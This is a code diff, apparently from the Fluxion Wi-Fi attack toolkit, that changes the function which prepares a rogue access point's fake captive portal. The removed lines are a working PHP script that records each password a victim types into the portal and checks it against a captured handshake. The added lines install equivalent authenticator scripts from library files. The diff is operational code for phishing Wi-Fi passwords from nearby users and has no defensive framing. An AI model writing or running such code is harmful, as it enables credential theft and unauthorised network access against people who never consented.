@@ -210,66 +210,17 @@ function captive_portal_set_attack() {
 	# AP Service: Prepare service for an attack.
 	ap_prep
 
-	# Generate the PHP check.php script, used to verify
+	# Add the PHP authenticator scripts, used to verify
 	# password attempts from users using the web interface.
-	echo "\
-<?php
-error_reporting(0);
-
-// Update hit attempts
-\$page_hits_log_path = (\"$FLUXIONWorkspacePath/hit.txt\");
-\$page_hits = file(\$page_hits_log_path)[0] + 1;
-\$page_hits_log = fopen(\$page_hits_log_path, \"w\");
-fputs(\$page_hits_log, \$page_hits);
-fclose(\$page_hits_log);
-
-// Receive get & post data and store to variables
-\$replyJSON = @\$_GET[\"dynamic\"];
-\$key = @\$_POST['key1'];
-
-// Prepare candidate and attempt passwords files' locations.
-\$attempt_log_path = \"$FLUXIONWorkspacePath/pwdattempt.txt\";
-\$candidate_path = \"$FLUXIONWorkspacePath/candidate.txt\";
-\$candidate_result_path = \"$FLUXIONWorkspacePath/candidate_result.txt\";
-
-\$attempt_log = fopen(\$attempt_log_path, \"w\");
-fwrite(\$attempt_log, \$key);
-fwrite(\$attempt_log, \"\n\");
-fclose(\$attempt_log);
-
-# Write candidate key to file to prep for checking.
-\$candidate = fopen(\$candidate_path, \"w\");
-fwrite(\$candidate, \$key);
-fwrite(\$candidate, \"\n\");
-fclose(\$candidate);
-
-# Create candidate result file to trigger checking.
-\$candidate_result = fopen(\$candidate_result_path, \"w\");
-fwrite(\$candidate_result,\"\n\");
-fclose(\$candidate_result);
-
-\$candidate_code = false;
-
-do {
-	sleep(1);
-	\$candidate_code = trim(file_get_contents(\$candidate_result_path));
-} while(!ctype_digit(\$candidate_code));
-
-# Reset file by deleting it.
-unlink(\$candidate_result);
-
-if (\$replyJSON) header(\"Content-Type: application/json\");
-
-if (\$candidate_code == 1) {
-	if (\$replyJSON) echo json_encode([\"mismatch\"]);
-	else header(\"Location:error.html\");
-}
-
-if (\$candidate_code == 2) {
-	if (\$replyJSON) echo json_encode([\"match\"]);
-	else header(\"Location:final.html\");
-}
-?>" > "$FLUXIONWorkspacePath/captive_portal/check.php"
+	local authenticatorFiles=("authenticator.php" "check.php" "update.php")
+	local FLUXIONWorkspacePathEscaped=$(echo "$FLUXIONWorkspacePath" | sed -e 's/\//\\\//g') 
+	for authenticatorFile in "${authenticatorFiles[@]}"; do
+		cp "$FLUXIONPath/attacks/Captive Portal/lib/$authenticatorFile" \
+			"$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
+		sed -i -e 's/\$FLUXIONWorkspacePath/'"$FLUXIONWorkspacePathEscaped"'/g' \
+			"$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
+		chmod u+x "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
+	done
 
 	# Generate the dhcpd configuration file, which is
 	# used to provide DHCP service to APRogue clients.
